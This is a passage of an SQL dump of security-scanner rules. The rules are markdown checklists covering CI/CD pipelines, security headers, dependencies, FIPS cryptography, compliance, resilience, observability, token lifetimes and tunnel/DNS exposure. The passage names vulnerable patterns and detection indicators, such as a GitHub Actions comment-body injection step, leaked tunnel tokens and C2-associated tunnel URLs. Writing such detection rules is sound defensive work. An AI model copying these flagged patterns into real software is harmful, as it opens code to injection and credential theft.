- Other CI: `Jenkinsfile`, `.circleci/config.yml`, `azure-pipelines.yml`

### What to Search For
- Secrets hardcoded in workflow files (not using `${{ secrets.* }}`)
- `pull_request_target` trigger with checkout of PR code (script injection vector)
- Workflow `permissions` not scoped (defaults to write-all)
- Expression injection in `run:` steps (e.g., `${{ github.event.issue.title }}` in shell)
- Third-party actions pinned to branch tags instead of commit SHA
- Self-hosted runners without isolation

### Actually Vulnerable
- API key or token as plain string in workflow YAML (not `${{ secrets.KEY }}`)
- Workflow with `pull_request_target` that checks out PR branch and runs PR code
- No `permissions:` key in workflow (inherits overly broad defaults)
- `run: echo ${{ github.event.comment.body }}` (arbitrary code injection via comment)
- `uses: actions/checkout@main` instead of `uses: actions/checkout@SHA`
- Self-hosted runner used for public repository workflows

### NOT Vulnerable
- Secrets referenced via `${{ secrets.* }}` syntax
- `pull_request` trigger (safe, runs in context of PR fork)
- Explicit `permissions:` with minimal scopes (e.g., `contents: read`)
- GitHub context values used in `with:` inputs (not shell `run:`)
- Actions pinned to full SHA (`uses: actions/checkout@abc123...`)
- Self-hosted runners for private repos with proper isolation

### Context Check
1. Is this a public or private repository?
2. Does the workflow use `pull_request_target` with code checkout?
3. Are GitHub context values used in shell `run:` commands or action `with:` inputs?
4. Are third-party actions pinned to commit SHAs?

### Files to Check
- `.github/workflows/*.yml`
- `.gitlab-ci.yml`, `Jenkinsfile`
- `.circleci/config.yml`
- CI/CD configuration in `package.json` scripts
', 'high', NULL, NULL, '.github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile, .circleci/config.yml, CI/CD configuration in package.json scripts', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-32', 'snitch-default-v1', 'Security Headers', '## CATEGORY 32: Security Headers

### Detection
- Web frameworks: Next.js, Express, Fastify, Koa
- Header configuration: `next.config.js`, `helmet` middleware, `_headers` files
- Response header setting patterns

### What to Search For
- Missing `Content-Security-Policy` header
- Missing `Strict-Transport-Security` (HSTS) header
- Missing `X-Frame-Options` or `frame-ancestors` CSP directive
- Missing `X-Content-Type-Options: nosniff`
- Missing `Referrer-Policy` header
- Overly permissive CSP (`unsafe-inline`, `unsafe-eval`, wildcard `*` sources)

### Actually Vulnerable
- No CSP header configured anywhere (no `next.config.js` headers, no helmet, no `_headers`)
- No HSTS header on production deployment
- No clickjacking protection (missing both `X-Frame-Options` and CSP `frame-ancestors`)
- CSP with `unsafe-inline` and `unsafe-eval` (defeats purpose of CSP)
- CSP with wildcard sources (`*.example.com` or `*`)
- Missing `X-Content-Type-Options` allowing MIME sniffing

### NOT Vulnerable
- CSP configured in `next.config.js` headers, Express `helmet()`, or `_headers` file
- HSTS configured at infrastructure level (Cloudflare, Vercel, load balancer)
- `X-Frame-Options: DENY` or CSP `frame-ancestors ''none''` set
- CSP with nonce-based inline scripts (not blanket `unsafe-inline`)
- Strict `Referrer-Policy` configured

### Context Check
1. Is CSP configured at application level or infrastructure level?
2. Is HSTS handled by the hosting platform (Vercel, Cloudflare)?
3. Are `unsafe-inline`/`unsafe-eval` required for the framework (some need it with nonces)?
4. Is this an API-only service (some headers less relevant)?

### Files to Check
- `next.config.js`, `next.config.ts` (check `headers()` function)
- `**/middleware*.ts` (check response header setting)
- Express/Fastify app setup files (check for `helmet()`)
- `public/_headers`, `vercel.json`, `netlify.toml`
- `**/server*.ts`, `**/app*.ts`
', 'medium', NULL, NULL, 'next.config.js, next.config.ts (check headers() function), **/middleware*.ts (check response header setting), Express/Fastify app setup files (check for helmet()), public/_headers, vercel.json, netlify.toml, **/server*.ts, **/app*.ts', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-33', 'snitch-default-v1', 'Unused Dependencies & Package Bloat', '## CATEGORY 33: Unused Dependencies & Package Bloat

### Detection
- `package.json` with `dependencies` and `devDependencies` sections
- Source files across the project that import or require packages

### Active Check Step
For each package listed under `dependencies` (not devDependencies), grep the entire codebase for any import or require of that package:

```
import ... from ''package-name''
require(''package-name'')
import(''package-name'')
```

If zero hits are found in source files (excluding `node_modules/`), the package is a candidate for removal.

### What to Search For
- Packages in `dependencies` with no corresponding import/require in any source file
- Large packages with lightweight alternatives:
  - `moment` (330KB) → `date-fns`, `dayjs`, or native `Intl.DateTimeFormat`
  - `lodash` → individual `lodash/function` imports or native JS equivalents
  - `request` (deprecated) → `fetch` (built into Node 18+) or `axios`
  - `node-fetch` → native `fetch` (Node 18+ has it built in)
  - `bluebird` → native `Promise`
- Duplicate functionality packages (e.g., both `axios` AND `node-fetch` installed)
- Build/dev tools listed under `dependencies` instead of `devDependencies`:
  - `eslint`, `prettier`, `typescript`, `jest`, `vitest`, `webpack`, `vite`, `esbuild`
  - `@types/*` packages (always devDependencies)
  - Linting configs, test frameworks, build plugins

### Actually Vulnerable (Flag These)
- Package in `dependencies` with zero import hits in any source file
- `moment` used for simple date formatting when native `Intl` would work
- `lodash` imported as the full library (`import _ from ''lodash''`) and only 1-2 functions used
- Deprecated packages (`request`, `node-fetch` on Node 18+, `unirest`)
- `devDependencies` correctly named tools accidentally placed under `dependencies`
- Both `axios` and `node-fetch` (or similar) installed — pick one

### NOT Vulnerable
- Packages legitimately imported somewhere in source code
- `devDependencies` that are build tools correctly placed
- Packages used only in config files (e.g., `tailwindcss` required by `tailwind.config.js`)
- Packages that are peer dependencies of other installed packages (transitively required)
- Packages used in scripts (e.g., `dotenv` loaded via `node -r dotenv/config`)

### Context Check
1. Search for `import` AND `require` of the package name across all non-node_modules source files
2. Check config files — some packages are loaded there, not in src
3. Is the package a CLI tool invoked in npm scripts (not imported in code)?
4. Is it a peer dependency required by another installed package?
5. Is `devDependencies` placement correct vs `dependencies`?

### Files to Check
- `package.json` (scan every entry under `dependencies`)
- `**/src/**/*.{ts,tsx,js,jsx}`, `**/app/**/*.{ts,tsx}`, `**/pages/**/*.{ts,tsx}`
- Config files: `tailwind.config.*`, `next.config.*`, `jest.config.*`, `vite.config.*`
', 'medium', NULL, NULL, 'package.json (scan every entry under dependencies), **/src/**/*.{ts,tsx,js,jsx}, **/app/**/*.{ts,tsx}, **/pages/**/*.{ts,tsx}, Config files: tailwind.config.*, next.config.*, jest.config.*, vite.config.*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-34', 'snitch-default-v1', 'FIPS 140-3 / Cryptographic Compliance', '## CATEGORY 34: FIPS 140-3 / Cryptographic Compliance

> **Cross-reference:** Overlaps with Category 9 (Cryptography). Only flag here when there is specific FIPS compliance context (regulated environment, government contract, healthcare, finance). For general crypto weaknesses defer to Cat 9.

### Detection
- `crypto`, `node:crypto`, `openssl`, `crypto-js`, `forge`, `jose` imports
- TLS/SSL config files, nginx/haproxy configs with cipher suite settings
- `.env` files with `TLS_*`, `SSL_*`, `CIPHER_*` vars
- Files containing `createCipheriv`, `createDecipheriv`, `createHash`

### What to Search For
- Hash function usage: `md5`, `sha1`, `sha-1` in security contexts (signing, auth)
- Cipher names: `RC4`, `DES`, `3DES`, `Blowfish`, `RC2`, `IDEA`
- TLS version strings: `TLSv1`, `TLSv1.1`, `TLSv1.0`, `SSLv3`
- Key size parameters: RSA modulus < 2048, EC curves < 224-bit (secp192r1, prime192v1)
- FIPS mode disabled: `crypto.setFips(false)`, `OPENSSL_NO_FIPS`, absence of `fips: true` in regulated context
- Custom crypto: manual XOR operations, custom PRNG, seed-based random used for tokens or IVs

### Critical
- Non-FIPS symmetric cipher (RC4, DES, 3DES, Blowfish) used for data encryption
- MD5 or SHA-1 used for digital signatures or password hashing in production
- TLS 1.0 or 1.1 explicitly permitted in production TLS config
- RSA key < 2048 bits generated or hardcoded

### High
- `Math.random()` used as initialization vector (IV) or for token generation
- SHA-1 used for HMAC in authentication contexts
- Elliptic curve < 224-bit (e.g., secp192r1)
- FIPS mode explicitly disabled (`crypto.setFips(false)`) with no compensating control
- `rejectUnauthorized: false` in production TLS client (not gated to dev)

### Medium
- SHA-1 used only for non-security checksums (flag with note to confirm context)
- Cipher suites not in NIST-approved list for TLS 1.2

### Context Check
1. Is this a regulated environment (government, federal contractor, healthcare, finance)?
2. Is the algorithm used for security (auth, signing, encryption) or just checksums/cache keys?
3. Is `rejectUnauthorized: false` or TLS 1.0 gated to dev/test environments only?

### NOT Vulnerable (False Positives)
- MD5 used only for cache keys or non-security ETags
- SHA-1 used only for git object IDs or non-security checksums
- TLS 1.0/1.1 configuration in files clearly marked as test-only / local dev
- FIPS-approved algorithms: AES-128-GCM, AES-256-GCM, SHA-256, SHA-384, SHA-512, ECDSA P-256/P-384, RSA-2048+

### Files to Check
- `**/crypto*.{ts,js}`, `**/tls*.{ts,js}`, `**/ssl*.{ts,js}`
- `nginx.conf`, `haproxy.cfg`, `*.pem`, `.env*`
- Any file with `createCipheriv`, `createHash`, `generateKeyPair`
', 'high', NULL, NULL, '**/crypto*.{ts,js}, **/tls*.{ts,js}, **/ssl*.{ts,js}, nginx.conf, haproxy.cfg, *.pem, .env*, Any file with createCipheriv, createHash, generateKeyPair', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-35', 'snitch-default-v1', 'Security Governance Certifications (ISO 27001 / FedRAMP / CMMC)', '## CATEGORY 35: Security Governance Certifications (ISO 27001 / FedRAMP / CMMC)

> **Cross-reference:** Overlaps with Category 21 (SOC 2) for audit logs and Category 11 (Cloud Security) for IAM/cloud config. Only flag here for ISO 27001 / FedRAMP / CMMC specific gaps — not for general cloud or logging issues already covered by those categories.

### Detection
- Keywords in code/config: `iso27001`, `fedramp`, `cmmc`, `govcloud`, `cui`, `nist800`, `ato`
- `.gov` or `.mil` domains in config/env variables
- `us-gov-*` AWS regions, Azure Government endpoints, GovCloud references
- DoD contract or classification comments (`// CUI`, `// FOUO`, `// CONTROLLED`)
- SSP (System Security Plan) or POA&M references in docs

### What to Search For
- CUI handling: files processing `cui`, `controlled unclassified`, `fouo` without encryption wrapper
- FedRAMP boundary: API calls to non-GovCloud endpoints where federal data context exists
- Audit completeness: privileged operations (user deletion, role change, key rotation) missing audit log entries
- Access control: admin/privileged routes missing MFA enforcement or role-based check
- Data classification: sensitive handlers with no classification labeling
- Incident response: no error/event hooks that could feed a SIEM or alerting system
- CMMC Level 2: multi-factor auth not enforced for privileged accounts, no session timeout
- ISO 27001 A.10: sensitive data stored without encryption at rest
- ISO 27001 A.15: third-party/vendor access not documented or restricted

### Critical
- CUI data transmitted without TLS or stored unencrypted (CMMC L2 AC.2.006)
- Federal data processed outside FedRAMP-authorized boundary (non-GovCloud endpoint)
- No audit log on privileged operations (ISO 27001 A.12.4, CMMC AU.2.041)

### High
- Admin endpoints with no MFA enforcement (ISO 27001 A.9.4, CMMC IA.3.083)
- Missing data retention or deletion policy for sensitive records (ISO 27001 A.8.3)
- No incident response hook or alerting mechanism (ISO 27001 A.16, FedRAMP IR controls)
- Session timeout not enforced for privileged sessions (CMMC AC.2.007)

### Medium
- No data classification labels on sensitive model or handler files
- Third-party/vendor data processors not documented or access-controlled (ISO 27001 A.15)
- Encryption-at-rest not documented for sensitive databases

### Context Check
1. Is this application under a government contract, FedRAMP ATO, or CMMC certification scope?
2. Are CUI markers in comments indicating awareness, or actual unprotected sensitive data?
3. Is the audit log gap in production code or test scaffolding?

### NOT Vulnerable (False Positives)
- `govcloud` string in comments discussing migration plans (not actual endpoints)
- CUI labels in documentation/markdown files (not in code handling data)
- Missing audit logs in test helpers or fixtures

### Files to Check
- `**/admin*.{ts,js}`, `**/privileged*.{ts,js}`
- `.env*` files with `GOV`, `FEDERAL`, `CUI` vars
- `**/models/*.{ts,js}` for data classification
- `**/routes/**`, `**/api/**` for access control enforcement
', 'medium', NULL, NULL, '**/admin*.{ts,js}, **/privileged*.{ts,js}, .env* files with GOV, FEDERAL, CUI vars, **/models/*.{ts,js} for data classification, **/routes/**, **/api/** for access control enforcement', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-36', 'snitch-default-v1', 'Business Continuity & Disaster Recovery', '## CATEGORY 36: Business Continuity & Disaster Recovery

> **Maps to Upstash Trust Center controls:** "Continuity and Disaster Recovery plans established", "Continuity and disaster recovery plans tested", "Backup processes established", "Infrastructure performance monitored"

### Detection
- Health check endpoints: `/health`, `/ready`, `/live`, `/healthz`, `/readyz`, `/livez`
- Process signal handlers: `SIGTERM`, `SIGINT`, `process.on(''beforeExit'')`
- Circuit breaker libraries: `opossum`, `cockatiel`, custom circuit breaker patterns
- Retry/backoff patterns: `retry`, `exponential-backoff`, `p-retry`
- IaC backup configs: Terraform `aws_db_instance` with `backup_retention_period`, RDS snapshots

### What to Search For
- Health check / readiness / liveness endpoints
- Graceful shutdown handlers (`SIGTERM`, `SIGINT`, `process.on(''beforeExit'')`)
- Circuit breaker patterns (library-based or custom state machines)
- Retry logic with exponential backoff
- Database connection pool failover / reconnect logic
- Backup configuration in IaC (Terraform backup resources, RDS snapshots, etc.)
- Multi-region / multi-AZ deployment configs
- Queue dead-letter configs (DLQ)
- Error recovery / fallback patterns

### Critical
- No health check endpoint found in any server entry point (no `/health`, `/ready`, or equivalent)
- No graceful shutdown handler — server does not listen for `SIGTERM` or `SIGINT`
- Database connections with no reconnect logic and no connection pool (single connection, crash on disconnect)

### High
- No circuit breaker or retry pattern for external service calls (API, database, cache)
- No dead-letter queue configuration for async message processing
- No backup configuration in IaC for production databases
- Missing connection pool failover (single-host connection string with no fallback)

### Medium
- Health endpoint returns 200 without actually checking downstream dependencies
- Retry logic without exponential backoff (fixed delay or no delay)
- No multi-AZ or multi-region configuration in IaC

### Context Check
1. Does the application have a health check endpoint that verifies actual service health?
2. Does the server handle `SIGTERM` gracefully (drain connections, close pools)?
3. Are external service calls wrapped in circuit breakers or retry logic?
4. Is there backup configuration for production data stores?

### NOT Vulnerable
- Health endpoints that check database and cache connectivity before returning 200
- Graceful shutdown draining in-flight requests before exit
- Circuit breaker libraries wrapping external API calls
- Retry with exponential backoff and jitter
- IaC with automated backup and point-in-time recovery configured
- Kubernetes liveness/readiness probes defined in deployment manifests

### Files to Check
- `**/server*.{ts,js}`, `**/app*.{ts,js}`, `**/index*.{ts,js}` (entry points)
- `**/health*.{ts,js}`, `**/ready*.{ts,js}`
- `**/*.tf`, `**/docker-compose*.yml`, `**/k8s/**/*.yml`
- `**/queue*.{ts,js}`, `**/worker*.{ts,js}`
', 'medium', NULL, NULL, '**/server*.{ts,js}, **/app*.{ts,js}, **/index*.{ts,js} (entry points), **/health*.{ts,js}, **/ready*.{ts,js}, **/*.tf, **/docker-compose*.yml, **/k8s/**/*.yml, **/queue*.{ts,js}, **/worker*.{ts,js}', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-37', 'snitch-default-v1', 'Infrastructure Monitoring & Observability', '## CATEGORY 37: Infrastructure Monitoring & Observability

> **Maps to Upstash Trust Center controls:** "Infrastructure performance monitored", "Log management utilized", "Intrusion detection system utilized", "Vulnerability and system monitoring procedures established"

### Detection
- APM/monitoring packages: `@sentry/node`, `@datadog/datadog-api-client`, `dd-trace`, `newrelic`, `@elastic/apm-node`
- Metrics packages: `prom-client`, `@opentelemetry/*`, `hot-shots` (StatsD)
- Logging packages: `winston`, `pino`, `bunyan` (structured), vs raw `console.log`
- Alerting integrations: PagerDuty, OpsGenie, Slack webhook for alerts

### What to Search For
- APM/monitoring integration (Datadog, New Relic, Sentry, Grafana, Prometheus)
- Structured logging vs raw `console.log` in production
- Alert/notification configuration (PagerDuty, OpsGenie, Slack webhooks for alerts)
- Metric collection (StatsD, Prometheus client, custom metrics)
- Error tracking integration (Sentry DSN, Bugsnag, Rollbar)
- Uptime/health check endpoint existence
- Log levels configured (not all debug in production)
- Distributed tracing (OpenTelemetry, Jaeger, Zipkin)

### Critical
- No error tracking or APM integration in a production application (no Sentry, Datadog, New Relic, or equivalent)
- No structured logging library — production code relies entirely on `console.log` / `console.error`

### High
- No alerting integration — errors captured but no notification channel (PagerDuty, OpsGenie, Slack)
- No metric collection for application performance (no Prometheus, StatsD, or cloud metrics)
- Log level set to `debug` or `trace` in production configuration
- No distributed tracing in a microservices architecture

### Medium
- Structured logging library installed but no log correlation IDs (request tracing across services)
- Error tracking DSN hardcoded instead of environment variable
- No custom application metrics beyond default framework metrics

### Context Check
1. Is this a production application or a prototype/hobby project?
2. Is monitoring handled at infrastructure level (cloud provider monitoring, Vercel analytics)?
3. Does the structured logging library produce JSON or plain text?
4. Are alerts routed to an on-call system or just logged?

### NOT Vulnerable
- Sentry, Datadog, or New Relic properly configured with DSN from environment variables
- Structured logging with `winston` or `pino` producing JSON output
- AlertManager, PagerDuty, or OpsGenie integration for critical errors
- OpenTelemetry or equivalent distributed tracing configured
- Prometheus metrics endpoint exposed for scraping
- Log levels properly configured per environment (debug in dev, info/warn in prod)

### Files to Check
- `**/instrument*.{ts,js}`, `**/tracing*.{ts,js}`, `**/telemetry*.{ts,js}`
- `**/logger*.{ts,js}`, `**/logging*.{ts,js}`
- `**/sentry*.{ts,js}`, `**/datadog*.{ts,js}`, `**/newrelic*.{ts,js}`
- `**/metrics*.{ts,js}`, `**/monitoring*.{ts,js}`
- `.env*` (check for `SENTRY_DSN`, `DD_API_KEY`, `NEW_RELIC_LICENSE_KEY`)
', 'medium', NULL, NULL, '**/instrument*.{ts,js}, **/tracing*.{ts,js}, **/telemetry*.{ts,js}, **/logger*.{ts,js}, **/logging*.{ts,js}, **/sentry*.{ts,js}, **/datadog*.{ts,js}, **/newrelic*.{ts,js}, **/metrics*.{ts,js}, **/monitoring*.{ts,js}, .env* (check for SENTRY_DSN, DD_API_KEY, NEW_RELIC_LICENSE_KEY)', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-38', 'snitch-default-v1', 'Data Classification & Lifecycle', '## CATEGORY 38: Data Classification & Lifecycle

> **Maps to Upstash Trust Center controls:** "Data classification policy established", "Data retention procedures established", "Customer data deleted upon leaving", "Data encryption utilized"
>
> **Cross-reference:** Overlaps with Category 23 (GDPR) for data deletion/export and Category 20 (HIPAA) for PHI handling. Only flag here for classification labeling, retention TTLs, and lifecycle management not covered by those categories.

### Detection
- Data model definitions: Prisma schema, Drizzle schema, Mongoose models, TypeORM entities
- TTL/expiry patterns: `expiresAt`, `ttl`, `retentionDays`, `deleteAfter`
- Cleanup/purge jobs: `cron`, `node-cron`, `@upstash/qstash`, scheduled functions
- PII markers: `@sensitive`, `@pii`, `@classified`, data classification decorators

### What to Search For
- Data classification labels/markers on models or schemas
- Data retention TTLs / cleanup jobs / cron for purging old data
- Customer data export endpoints (data portability)
- Customer data deletion cascades (account deletion completeness)
- PII field markers/decorators in schemas
- Sensitive data segregation (separate tables/collections for PII)
- Data anonymization/pseudonymization functions

### Critical
- User/customer data with no deletion mechanism — account deletion leaves orphan records in related tables
- PII stored alongside non-sensitive data with no field-level encryption or access segregation

### High
- No data retention policy — no TTL, `expiresAt`, or cleanup job for any user-generated data
- No data classification markers on schemas containing PII fields (email, phone, address, SSN, DOB)
- Account deletion endpoint exists but does not cascade to all related tables (partial deletion)
- Sensitive data (tokens, keys, PII) stored in same table/collection as public data with no access differentiation

### Medium
- No anonymization or pseudonymization functions for analytics data derived from PII
- Data retention TTLs defined but no automated cleanup job to enforce them
- No customer data export/portability endpoint (beyond GDPR scope — general best practice)

### Context Check
1. Does the application store PII (email, phone, address, financial data)?
2. Is there a data retention policy defined (even informally in docs)?
3. Does account deletion cascade to all related tables and external services?
4. Are PII fields identifiable in schemas (labeled, commented, or in separate models)?

### NOT Vulnerable
- Schemas with explicit PII markers or comments identifying sensitive fields
- Automated cleanup jobs (cron, scheduled function) purging expired data
- Account deletion that cascades to all related records (ON DELETE CASCADE or application-level)
- Separate encrypted tables/collections for PII with restricted access
- Data anonymization applied before analytics processing
- Data export endpoint returning user''s data in portable format

### Files to Check
- `prisma/schema.prisma`, `**/schema*.{ts,js}`, `**/models/**/*.{ts,js}`
- `**/cron*.{ts,js}`, `**/jobs/**/*.{ts,js}`, `**/cleanup*.{ts,js}`
- `**/delete*account*.{ts,js}`, `**/account*delete*.{ts,js}`
- `**/anonymize*.{ts,js}`, `**/pseudonymize*.{ts,js}`
- `**/export*data*.{ts,js}`, `**/data*export*.{ts,js}`
', 'medium', NULL, NULL, 'prisma/schema.prisma, **/schema*.{ts,js}, **/models/**/*.{ts,js}, **/cron*.{ts,js}, **/jobs/**/*.{ts,js}, **/cleanup*.{ts,js}, **/delete*account*.{ts,js}, **/account*delete*.{ts,js}, **/anonymize*.{ts,js}, **/pseudonymize*.{ts,js}, **/export*data*.{ts,js}, **/data*export*.{ts,js}', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-39', 'snitch-default-v1', 'Token & Session Lifetime Analysis', '## CATEGORY 39: Token & Session Lifetime Analysis

> **Cross-reference:** Category 4 covers auth mechanism security (weak JWT secrets, open redirects). Category 14 covers provider misconfiguration. Category 21 flags *missing* timeouts for SOC 2 compliance. This category evaluates whether *configured* lifetimes are reasonable for the application''s use case, whether refresh flows exist, and whether logout actually invalidates tokens.

### Detection
- JWT libraries: `jsonwebtoken`, `jose`, `next-auth`, `@auth/core`, `better-auth`, `lucia`
- Session libraries: `express-session`, `iron-session`
- Auth providers: `@clerk/nextjs`, `@auth0/nextjs-auth0`
- Token patterns: `expiresIn`, `maxAge`, `ttl`, `refreshToken`, `jwt.sign`, `session.cookie.maxAge`

### What to Search For
- Token expiry configuration (`expiresIn`, `maxAge`, `ttl`)
- Refresh token creation and rotation logic
- Logout endpoint — does it invalidate the token server-side (blocklist, DB delete)?
- Session cookie settings (`secure`, `httpOnly`, `sameSite`, `maxAge`)
- Different token types (access vs refresh vs API key) and their durations
- Hardcoded magic numbers for durations with no comment or env var

### Context-Aware Evaluation Rules

**Before flagging any lifetime as too long or too short, determine the app type** from `package.json` description, README, route structure, and domain context. Apply the Lifetime Reasonableness Table:

| App Type | Access Token | Refresh Token | Notes |
|---|---|---|---|
| Banking / Healthcare | 5–15 min | 30–60 min | Short is correct; do NOT flag |
| Admin Panel | 15 min–1 hr | 4–8 hr | Step-up auth for sensitive ops |
| SaaS / Productivity | 15 min–1 hr | 7–30 days | Standard web app |
| Social / Consumer | 15 min–1 hr | 30–90 days | Long refresh is expected |
| API Service (M2M) | 1–24 hr | No refresh needed | API keys / service tokens |

### Critical
- No expiration set at all — token lives forever (`expiresIn` absent and no default)
- Access token >24 hours with no refresh flow
- Logout endpoint only clears client-side cookie/storage but does not invalidate token server-side (JWT stays valid until expiry)
- Refresh token >1 year
- Admin/elevated token >4 hours with no step-up authentication

### High
- Short access token with no refresh mechanism — users get silently logged out mid-session
- Access token duration longer than refresh token (inverted — refresh should always outlive access)
- Same duration for all token types (copy-paste pattern — access, refresh, and API tokens all set to `''1h''`)
- Hardcoded magic numbers with no explanatory comment or env var (e.g., `expiresIn: 86400` with no context)

### Medium
- Tutorial-default `''1h''` or `''7d''` with no evidence of deliberate choice (no comment, no env var, no docs)
- Mismatched session strategy — e.g., JWT with `express-session` both configured but not coordinated
- No sliding window / rolling session — session expires at fixed time regardless of activity
- Session cookie missing `secure`, `httpOnly`, or `sameSite` attributes

### Context Check
1. What type of application is this? (Determines reasonable lifetime ranges)
2. Is there a refresh token flow, or only a single access token?
3. Does logout actually invalidate the token (server-side blocklist, DB delete, session destroy)?
4. Are different token types (access, refresh, API) configured with appropriate different durations?
5. Is the lifetime value from an env var or config file (deliberate) vs hardcoded (accidental)?

### NOT Vulnerable
- Short access token (15 min) + working refresh flow with rotation
- Banking/healthcare app with aggressive 5–15 min timeout
- Lifetime loaded from environment variable with documentation explaining the choice
- Auth provider (Clerk, Auth0) managing token lifetime via their dashboard — app code defers to provider
- `expiresIn: ''1h''` with an explanatory comment like `// 1 hour access, refresh handles long sessions`
- Logout endpoint that calls `session.destroy()`, deletes refresh token from DB, or adds JWT to server-side blocklist

### Files to Check
- `**/auth*.{ts,js}`, `**/session*.{ts,js}`, `**/login*.{ts,js}`
- `**/logout*.{ts,js}`, `**/refresh*.{ts,js}`, `**/token*.{ts,js}`
- `**/api/auth/**`, `**/middleware*.{ts,js}`
- `.env*`, `**/config/**`
', 'high', NULL, NULL, '**/auth*.{ts,js}, **/session*.{ts,js}, **/login*.{ts,js}, **/logout*.{ts,js}, **/refresh*.{ts,js}, **/token*.{ts,js}, **/api/auth/**, **/middleware*.{ts,js}, .env*, **/config/**', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-40', 'snitch-default-v1', 'Infrastructure Tunneling & DNS Security (ngrok / Cloudflare / Resolvers)', '## CATEGORY 40: Infrastructure Tunneling & DNS Security (ngrok / Cloudflare / Resolvers)

> **Cross-reference:** Category 3 covers general hardcoded secrets. Category 11 covers broad cloud misconfiguration. Category 31 covers CI/CD pipeline secrets. This category focuses specifically on tunnel credential exposure, Cloudflare Workers secret management, and DNS resolver security.

### Detection

**Tunnel tooling:**
- ngrok: `ngrok` binary references, `.ngrok2/` or `.ngrok/` directories, `NGROK_AUTHTOKEN` env var
- cloudflared: `cloudflared` binary references, `.cloudflared/` directory, `TUNNEL_TOKEN` env var, `cert.pem`
- Quick tunnels: `trycloudflare.com` URLs (ephemeral tunnels, commonly abused for C2)

**Cloudflare Workers / Wrangler:**
- Config files: `wrangler.toml`, `wrangler.jsonc`, `wrangler.json`
- Local dev secrets: `.dev.vars`, `.wrangler/` directory
- API tokens: `CLOUDFLARE_API_TOKEN`, `CF_API_TOKEN`, `CF_ACCOUNT_ID`

**DNS / Resolvers:**
- Hardcoded resolver IPs: `1.1.1.1`, `1.0.0.1`, `8.8.8.8`, `8.8.4.4`, `9.9.9.9`
- Node.js DNS: `dns.setServers()`, `dns.resolve()` with hardcoded IPs
- Plaintext DNS: `dns://`, port `53` references without DoH/DoT
- Deprecated: `cloudflared proxy-dns` (removed Feb 2026 — vulnerable DNS library)

### What to Search For

**ngrok patterns:**
- `authtoken` in YAML/JSON/TOML config files
- Hardcoded `*.ngrok.io`, `*.ngrok.app`, `*.ngrok-free.app` URLs in source code
- `ngrok http`, `ngrok tcp`, `ngrok tls`, `ngrok start` in scripts or Dockerfiles
- `--authtoken` flag in shell commands
- `.ngrok2/ngrok.yml` or `.ngrok/config.yml` committed to git

**cloudflared patterns:**
- `TUNNEL_TOKEN` or `--token` hardcoded in scripts, docker-compose, or config
- `.cloudflared/credentials.json` or `.cloudflared/cert.pem` in repo
- `noTLSVerify: true` or `--no-tls-verify` in tunnel ingress config
- `proxy-dns` command usage (deprecated and removed)
- `trycloudflare.com` URLs in production code

**Wrangler / Miniflare patterns:**
- Sensitive keys in `[vars]` section of `wrangler.toml` (API_KEY, SECRET, TOKEN, PASSWORD, DATABASE_URL)
- `.dev.vars` tracked in git (should be in .gitignore)
- `.wrangler/` directory committed (build artifacts, may contain secrets)
- `api_token` field in wrangler config
- `compatibility_date` older than 12 months (missing security patches)
- Secrets passed via `miniflare --binding` command line

**DNS patterns:**
- Hardcoded resolver IPs in code or config without env var override
- `dns.setServers()` with literal IP arrays
- Plaintext DNS (port 53) without DoH/DoT fallback
- `dnsRebindingProtection: false` or similar bypass flags
- DNSSEC explicitly disabled
- `resolv.conf` modifications in Dockerfiles or scripts
- `--dns` flag in Docker with hardcoded IPs

### Critical
- ngrok authtoken in any tracked file (credential leak — attacker can hijack your tunnels)
- cloudflared tunnel token or credentials JSON committed to git
- Cloudflare API token (`CF_API_TOKEN`, `CLOUDFLARE_API_TOKEN`) hardcoded in source
- Plaintext secrets in `wrangler.toml` `[vars]` section (API keys, passwords, connection strings)
- `.dev.vars` or `.wrangler/` directory tracked in git

### High
- Hardcoded ngrok/cloudflared tunnel URLs in production code or config
- `trycloudflare.com` URLs in non-dev context (common C2 indicator)
- `--no-tls-verify` or `noTLSVerify: true` in tunnel config (disables TLS validation)
- `proxy-dns` usage (deprecated, vulnerable DNS library)
- `TUNNEL_TOKEN=` inline in docker-compose files
- Hardcoded DNS resolver IPs without configurable override
- DNS rebinding protection explicitly disabled

### Medium
- ngrok or cloudflared invocation in production scripts or Dockerfiles (dev tool shipped to prod)
- `compatibility_date` in wrangler config older than 12 months
- Plaintext DNS resolution (port 53) without DoH/DoT fallback
- Non-configurable resolver (hardcoded with no env var fallback)
